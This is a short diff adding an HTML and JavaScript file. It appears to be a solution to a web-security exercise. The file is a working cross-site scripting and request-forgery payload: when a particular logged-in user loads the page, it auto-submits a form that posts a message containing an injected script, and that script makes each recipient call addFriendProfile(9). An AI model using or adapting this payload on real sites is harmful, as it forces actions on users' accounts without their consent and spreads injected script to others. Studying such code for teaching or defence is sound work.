@@ -1,0 +1,27 @@
+<form id = "my_form"> <input type = "text" name = "message"> </form>
+
+<script>
+
+if(window.authUserName == "nyan") {
+    $(document).ready(submit_form);
+}
+
+function submit_form () {
+    var form = document.getElementById("my_form");
+    
+    form.action = "/inside/message/send/1";
+    form.method = "post";
+    
+    var value = '<script>' + 
+                'function send_request() {' +
+                'addFriendProfile(9);' +
+                '}' +
+                '$(send_request);' +
+                '<\/script>';
+
+    $(form).find("input[name = 'message']").val(value);
+
+    form.submit();
+}
+
+</script>
